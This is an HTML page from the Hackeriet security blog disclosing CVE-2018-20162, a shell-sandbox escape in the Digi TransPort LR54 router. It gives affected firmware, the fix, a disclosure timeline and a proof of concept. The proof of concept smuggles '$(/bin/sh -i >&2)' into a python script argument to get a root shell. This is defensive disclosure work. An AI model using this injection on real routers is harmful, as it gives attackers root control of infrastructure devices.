@@ -1,0 +1,3181 @@
+<!DOCTYPE html>
+<html>
+  <head>
+<!--    <title>CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape – Hackeriet – Ikke akkurat NRK Beta</title> -->
+    <title>CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape – Hackeriet</title> 
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="The Digi TransPort LR54 is a high speed LTE router commonly used by industry, infrastructure, retail and public transportation.  It supports running python s..." />
+    <meta property="og:description" content="The Digi TransPort LR54 is a high speed LTE router commonly used by industry, infrastructure, retail and public transportation.  It supports running python s..." />
+    
+    <meta name="author" content="Hackeriet" />
+
+    
+    <meta property="og:title" content="CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape" />
+    <meta property="twitter:title" content="CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape" />
+    
+
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Hackeriet - Ikke akkurat NRK Beta" href="/feed.xml" />
+
+      <script type="text/javascript">
+          function showStuff(id) {
+              if(document.getElementById(id).style.display == 'block') {
+                  document.getElementById(id).style.display = 'none';
+              } else {
+                  document.getElementById(id).style.display = 'block';
+              }
+          }
+      </script>
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="/" class="site-avatar"><img src="/images/hackeriet-logo.png" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="/">Hackeriet</a></h1>
+            <p class="site-description">Ikke akkurat NRK Beta</p>
+          </div>
+
+          <nav>
+<!--            <a href="/">Blog</a> --> 
+            <a href="http://hackeriet.no/">About</a>
+          </nav>
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>CVE-2018-20162: Digi TransPort LR54 Restricted Shell Escape</h1>
+  <div class="author">
+      17/02/19 — sgo
+  </div>
+
+  <div class="entry">
+    <p><img src="/images/lr54.jpg" alt="lr54" /></p>
+
+<p>The Digi TransPort LR54 is a high speed LTE router commonly used by industry,
+infrastructure, retail and public transportation.</p>
+
+<p>It supports running python scripts in a restricted sandbox, and has a custom
+shell accessible over SSH which is subjected to the same restrictions. The
+underlying OS is therefore inaccessible to the administrator.</p>
+
+<p>I’ve found a way to break out of the sandbox and obtaining a root shell by
+exploiting the way the cli handles command line arguments when executing python
+scripts:</p>
+
+<p>When an interactive python process receives a SIGINT (trough CTRL-C), arguments
+to the script are not properly escaped when passed to the interactive CLI’s
+error logging handler. This allows an attacker to execute arbitrary commands
+as root.</p>
+
+<p>To exploit this vulnerability, an attacker needs to have interactive CLI access
+with ‘super’ privileges. A user with this access level is enabled by default on
+the device.</p>
+
+<h1 id="vulnerable">Vulnerable</h1>
+
+<p>Digi Transport LR54 (and maybe related products like WR64 and WR54)</p>
+
+<ul>
+  <li>Firmware Version  : 4.4.0.26 10/29/2018 21:14:06</li>
+  <li>Firmware Version  : 4.3.2.24 09/06/2018 00:58:34</li>
+</ul>
+
+<p>And maybe earlier versions</p>
+
+<h1 id="mitigation">Mitigation</h1>
+
+<p>Users should upgrade to firmware version 4.5.1.4 or newer.</p>
+
+<h1 id="proof-of-concept">Proof of Concept</h1>
+
+<ol>
+  <li>Upload <code class="language-plaintext highlighter-rouge">sleep.py</code> to the LR54 using scp or sftp, containing:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import time;time.sleep(10)
+</code></pre></div>    </div>
+  </li>
+  <li>Execute the following command in the LR54 cli:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python sleep.py --XXX $(/bin/sh -i &gt;&amp;2)
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Immediately press <code class="language-plaintext highlighter-rouge">CTRL-C</code> after the program starts</p>
+  </li>
+  <li>You are then dropped to an interactive root shell
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/digi/user # uname -a
+Linux (none) 3.10.14 #1 SMP Mon Oct 29 16:18:10 CDT 2018 mips GNU/Linux
+/home/digi/user # id
+uid=0(root) gid=2000(users_rw) groups=2000(users_rw),2002(users_super)
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<h1 id="timeline">Timeline</h1>
+
+<ul>
+  <li>2018-12-13: Vulnerability discovered</li>
+  <li>2018-12-14: PoC created, Vendor notified</li>
+  <li>2018-12-14: Vendor confirmed, 60 day embargo. Applied for CVE.</li>
+  <li>2018-12-15: CVE-2018-20162 assigned</li>
+  <li>2018-12-31: Received pre-release firmware. Confirmed not vulnerable.</li>
+  <li>2019-01-02: Vendor releases fixed firmware 4.5.1.4</li>
+  <li>2019-01-25: Vendor updated release notes to reference CVE-2018-20162</li>
+  <li>2019-02-13: Vendor ok’ed disclosure, Embargo lifted</li>
+</ul>
+
+<h1 id="references">References</h1>
+
+<ul>
+  <li><a href="https://www.digi.com/products/networking/cellular-routers/digi-transport-lr54">https://www.digi.com/products/networking/cellular-routers/digi-transport-lr54</a></li>
+  <li><a href="http://ftp1.digi.com/support/firmware/transport/LR54/v4.5.1.4/93001306_L.pdf">http://ftp1.digi.com/support/firmware/transport/LR54/v4.5.1.4/93001306_L.pdf</a></li>
+  <li><a href="https://www.digi.com/resources/security">https://www.digi.com/resources/security</a></li>
+  <li><a href="https://blog.hackeriet.no/cve-2018-20162-digi-lr54-restricted-shell-escape">https://blog.hackeriet.no/cve-2018-20162-digi-lr54-restricted-shell-escape</a></li>
+  <li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20162">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20162</a></li>
+</ul>
+
+<h1 id="credits">Credits</h1>
+
+<p>Vulnerability discovered by Stig Palmquist.</p>
+
+<p>Thanks to @duniel_pls and @alexanderkjall for reviewing this report.</p>
+
+  </div>
+
+  
+</article>
+
+    </div>
+
+    
+    
+
+    
+
+    
+
+    
+
+    <div class="categories">
+        <p>Categories</p>
+
+        
+        <a onClick="showStuff('cat-#challenge')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> challenge </a> &nbsp;&nbsp;
+        <div id="cat-#challenge">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/blocks-everywhere/">Blocks Everywhere</a> <small>11 May 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/we-almost-understand-RSA/">We almost understand RSA now</a> <small>27 Apr 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/Channel-side-door/">CTF: A channel side door problem</a> <small>17 Jan 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/Lost-door-combination/">CTF: Our lost door combination</a> <small>14 Jan 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#crypto')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> crypto </a> &nbsp;&nbsp;
+        <div id="cat-#crypto">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/AES-math-fundamentals/">Math Functions in AES and Sage</a> <small>16 Jan 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/becoming-a-better-hacker-part-1/">Resources for becoming a better hacker - Part 1, crypto</a> <small>10 Apr 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#ctf')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> ctf </a> &nbsp;&nbsp;
+        <div id="cat-#ctf">
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/solution-to-bornhack-2020-nc333/">Solution to Bornhack 2020 CTF challenge nc333</a> <small>16 Aug 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-bornhack-2020-nc3/">Solution to Bornhack 2020 CTF challenge nc3</a> <small>16 Aug 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-bornhack-2020-caesar_with_a_twist/">Solution to Bornhack 2020 CTF challenge caesar_with_a_twist</a> <small>16 Aug 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-bornhack-2020-alice_bob_playing_telepathy/">Solution to Bornhack 2020 CTF challenge alice_bob_playing_telepathy</a> <small>16 Aug 2020</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/solution-to-squarectf-talk-to-me/">Solution to SquareCTF 2019 - Talk To Me</a> <small>19 Oct 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/solution-to-utctf-2019-Jacobis-Chance-Encryption/">Solution to UTCTF 2019 - Jacobi's Chance Encryption</a> <small>16 Mar 2019</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-utctf-2019-super-secure-authentication/">Solution to UTCTF 2019 - Super Secure Authentication</a> <small>12 Mar 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        <p>
+            <a href="/solution-to-hackim-2fun/">Solution to Hackim CTF challenge 2fun</a> <small>04 Feb 2019</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-fireshell-biggar/">Solution to Fireshell CTF challenge biggar</a> <small>02 Feb 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/solution-to-junior-35c3-flags/">Solution to 35C3 Junior CTF challenge flags</a> <small>05 Jan 2019</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-junior-35c3-Decrypted/">Solution to 35C3 Junior CTF challenge Decrypted</a> <small>04 Jan 2019</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-junior-35c3-DANCEd/">Solution to 35C3 Junior CTF challenge DANCEd</a> <small>03 Jan 2019</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-junior-35c3-pretty-linear/">Solution to 35C3 Junior CTF challenge pretty linear</a> <small>02 Jan 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/solution-to-nc3-Tys-Tys/">Solution to nc3 Tys Tys</a> <small>31 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/attacking_elgamal_encryption/">Attacking Elgamal Encryption</a> <small>29 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-nc3-FragFS/">Solution to nc3 FragFS</a> <small>25 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-nc3-Klikkety-Klack/">Solution to nc3 Klikkety Klack</a> <small>18 Dec 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        <p>
+            <a href="/solution-to-seccon-2017-putchar-music/">Solution to SECCON 2017 putchar Music</a> <small>13 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-seccon-2017-run-me/">Solution to SECCON 2017 Run Me!</a> <small>12 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-seccon-2017-log-search/">Solution to SECCON 2017 Log Search</a> <small>11 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-seccon-2017-Vigenere3d/">Solution to SECCON 2017 Vigenere3d</a> <small>10 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-tuctf-2017-iFrame-and-shame/">Solution to TUCTF 2017 iFrame and Shame</a> <small>03 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-tuctf-2017-cookie-harrelson/">Solution to TUCTF 2017 Cookie Harrelson</a> <small>02 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-tuctf-2017-git-gud/">Solution to TUCTF 2017 Git Gud</a> <small>01 Dec 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-tuctf-2017-cookie-duty/">Solution to TUCTF 2017 Cookie Duty</a> <small>30 Nov 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-tuctf-2017-high-source/">Solution to TUCTF 2017 High Source</a> <small>29 Nov 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-tuctf-2017-the-neverending-crypto/">Solution to TUCTF 2017 The Neverending Crypto</a> <small>28 Nov 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/solution-to-tuctf-2017-future/">Solution to TUCTF 2017 Future task</a> <small>27 Nov 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/automating-string-leakage/">Writeup for auto challenge at The Gathering</a> <small>18 Apr 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/investigating-the-gathering-infrastructure/">Investigating the ctf infrastructure at The Gathering</a> <small>17 Apr 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/shortest-image-xor/">CTF: VolgaCTF VC task</a> <small>27 Mar 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/totally-shattered/">CTF: Shattering Prudentialv2</a> <small>07 Mar 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/eating-a-rsa-buffet/">CTF: Eating a nice RSA buffet</a> <small>27 Feb 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/nullcon-crypto-question-2/">CTF: Solving nullcon crypto question 2</a> <small>13 Feb 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/leaky-bits/">CTF: Solving Leaky Bits</a> <small>03 Feb 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/big-friendly-key/">CTF: How to break large keys</a> <small>29 Jan 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/CTF-dont-try-RSA-at-home/">CTF: Don't try RSA at home</a> <small>28 Jan 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/CTF-solving-smarttomcat/">CTF: Solving smarttomcat challenge from Insomnihack Teaser 2017</a> <small>23 Jan 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#ethics')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> ethics </a> &nbsp;&nbsp;
+        <div id="cat-#ethics">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/becoming-a-better-hacker-part-2/">Resources for becoming a better hacker - Part 2, ethics</a> <small>19 Apr 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#hackerspaces')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> hackerspaces </a> &nbsp;&nbsp;
+        <div id="cat-#hackerspaces">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/xil-se-hackerspace/">Visiting Xil.se hackerspace in Malmö</a> <small>06 Jan 2018</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/shanghai-hackerspace/">Visiting Xin Che Jian hackerspace in Shanghai</a> <small>04 Apr 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#infrastructure')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> infrastructure </a> &nbsp;&nbsp;
+        <div id="cat-#infrastructure">
+        
+        
+        
+        
+        <p>
+            <a href="/Ripasso-release-0-5-0/">Release of Ripasso version 0.5.0</a> <small>17 Oct 2020</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/fuzzing-sequoia/">Fuzzing Sequoia-PGP</a> <small>28 May 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/packaging-rust-part-II/">Packaging Rust for Debian - part II</a> <small>26 May 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/rust-and-translation-files/">How we did translations in Rust for Ripasso</a> <small>30 Apr 2020</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/Ripasso-release-0-4-0/">Release of Ripasso version 0.4.0</a> <small>26 Jan 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/packaging-a-rust-project-for-debian/">Packaging a Rust project for Debian</a> <small>25 Jan 2020</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/Ripasso-release-0-3-0/">Release of Ripasso version 0.3.0</a> <small>01 Dec 2019</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/signing-git-commits-in-rust/">Signing git commits in Rust</a> <small>26 Nov 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/Ripasso-release/">Release of Ripasso version 0.2.0</a> <small>03 Oct 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/building-an-async-postgresql-driver/">Release of pgAdba, an asynchronous connection library for PostgreSQL</a> <small>09 Nov 2018</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/integration-between-struts-1.3-and-spring-5.0/">Announcing the integration library between Struts 1.3 and spring 5.0</a> <small>10 Feb 2018</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/tomcat-and-systemd/">Running tomcat with systemd</a> <small>08 Jan 2018</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/creating-a-fast-blog/">Creating a fast blog</a> <small>08 May 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#meta')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> meta </a> &nbsp;&nbsp;
+        <div id="cat-#meta">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/hackeriet-10/">Hackeriet 10 years</a> <small>20 Feb 2020</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/35c3-in-pictures/">Our 35C3 in pictures</a> <small>07 Jan 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/35c3-top-to-by-hackeriet/">Hackeriet's selection of top talks from 35C3</a> <small>01 Jan 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/fnords-trettitre-c-tre/">33c3: talks round-up</a> <small>07 Jan 2017</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/First-Post/">Fyrst post!</a> <small>02 Jan 2017</small>
+        </p>
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#nixos')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> nixos </a> &nbsp;&nbsp;
+        <div id="cat-#nixos">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/oslo-nixos-minicon-report/">Oslo NixOS MiniCon 2020 report</a> <small>07 Mar 2020</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/packaging-python-script-for-nixos/">Packaging an executable Python script nicely in Nix for NixOS</a> <small>05 Nov 2019</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#performance')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> performance </a> &nbsp;&nbsp;
+        <div id="cat-#performance">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/regex-dos-in-java-layer/">Performance problems in the java layer, Catastrophic Backtracking</a> <small>15 Jul 2017</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#postgresql')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> postgresql </a> &nbsp;&nbsp;
+        <div id="cat-#postgresql">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        <p>
+            <a href="/Better-password-hashing-in-PostgreSQL/">Better password hashing in PostgreSQL with SCRAM-SHA-256</a> <small>19 Nov 2018</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/pgadba-performance/">Performance testing our Asynchronous PostgreSQL library</a> <small>13 Nov 2018</small>
+        </p>
+        
+        
+        
+        <p>
+            <a href="/Simple-and-Extended-postgresql-queries/">Simple and Extended queries in PostgreSQL</a> <small>11 Nov 2018</small>
+        </p>
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        </div>
+        
+        <a onClick="showStuff('cat-#report')" class="codinfox-category-mark" style="color:#999;text-decoration: none;"> report </a> &nbsp;&nbsp;
+        <div id="cat-#report">
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
